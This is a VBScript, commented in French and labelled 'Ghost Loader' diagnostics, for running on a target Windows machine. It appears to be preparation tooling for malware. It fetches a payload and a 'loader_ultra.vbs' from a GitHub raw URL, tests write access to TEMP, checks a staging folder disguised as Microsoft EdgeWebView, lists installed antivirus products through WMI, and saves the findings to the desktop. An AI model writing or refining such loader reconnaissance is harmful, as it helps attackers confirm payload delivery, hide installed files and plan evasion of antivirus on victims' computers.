' =====================================================
' DIAGNOSTIC COMPLET - Executez sur machine cible
' =====================================================
Option Explicit
On Error Resume Next

Dim ws, fs, report
Set ws = CreateObject("WScript.Shell")
Set fs = CreateObject("Scripting.FileSystemObject")

report = "=== DIAGNOSTIC GHOST LOADER ===" & vbCrLf
report = report & "Date: " & Now & vbCrLf & vbCrLf

' Test 1: Internet
report = report & "[1] TEST INTERNET..." & vbCrLf
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
If Err.Number <> 0 Then
    report = report & "  ERREUR: " & Err.Description & vbCrLf
    Err.Clear
Else
    http.SetTimeouts 10000, 10000, 10000, 10000
    http.Open "GET", "https://www.google.com", False
    http.Send
    report = report & "  Google: " & http.Status & vbCrLf
    
    http.Open "GET", "https://raw.githubusercontent.com/sophieduval/der/main/logo.svg", False
    http.Send
    report = report & "  GitHub Payload: " & http.Status & " (" & Len(http.responseText) & " bytes)" & vbCrLf
    
    http.Open "GET", "https://raw.githubusercontent.com/sophieduval/der/main/loader_ultra.vbs", False
    http.Send
    report = report & "  GitHub VBS: " & http.Status & vbCrLf
End If

' Test 2: Permissions
report = report & vbCrLf & "[2] TEST PERMISSIONS..." & vbCrLf
Dim testPath, testFile
testPath = ws.ExpandEnvironmentStrings("%TEMP%") & "\test_write.txt"
Set testFile = fs.CreateTextFile(testPath, True)
If Err.Number = 0 Then
    testFile.WriteLine "test"
    testFile.Close
    fs.DeleteFile testPath
    report = report & "  TEMP write: OK" & vbCrLf
Else
    report = report & "  TEMP write: FAIL - " & Err.Description & vbCrLf
    Err.Clear
End If

' Test 3: EdgeWebView folder
report = report & vbCrLf & "[3] TEST DOSSIER CIBLE..." & vbCrLf
Dim targetDir
targetDir = ws.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\EdgeWebView\Application"
report = report & "  Path: " & targetDir & vbCrLf
If fs.FolderExists(targetDir) Then
    report = report & "  Existe: OUI" & vbCrLf
Else
    report = report & "  Existe: NON (sera cree)" & vbCrLf
End If

' Test 4: Execution policy
report = report & vbCrLf & "[4] TEST EXECUTION..." & vbCrLf
report = report & "  WScript version: " & WScript.Version & vbCrLf
report = report & "  ScriptFullName: " & WScript.ScriptFullName & vbCrLf

' Test 5: AV Detection
report = report & vbCrLf & "[5] ANTIVIRUS..." & vbCrLf
Dim av
Set av = GetObject("winmgmts:\\.\root\SecurityCenter2").ExecQuery("SELECT * FROM AntiVirusProduct")
If Err.Number = 0 Then
    Dim prod
    For Each prod In av
        report = report & "  " & prod.displayName & vbCrLf
    Next
Else
    report = report & "  Impossible de detecter" & vbCrLf
    Err.Clear
End If

' Save report
Dim reportPath, ts
reportPath = ws.ExpandEnvironmentStrings("%USERPROFILE%") & "\Desktop\DIAGNOSTIC.txt"
Set ts = fs.CreateTextFile(reportPath, True)
ts.Write report
ts.Close

MsgBox "Diagnostic termine!" & vbCrLf & vbCrLf & "Rapport sauvegarde sur le Bureau:" & vbCrLf & reportPath, vbInformation, "Diagnostic"

Set ws = Nothing
Set fs = Nothing
Set http = Nothing
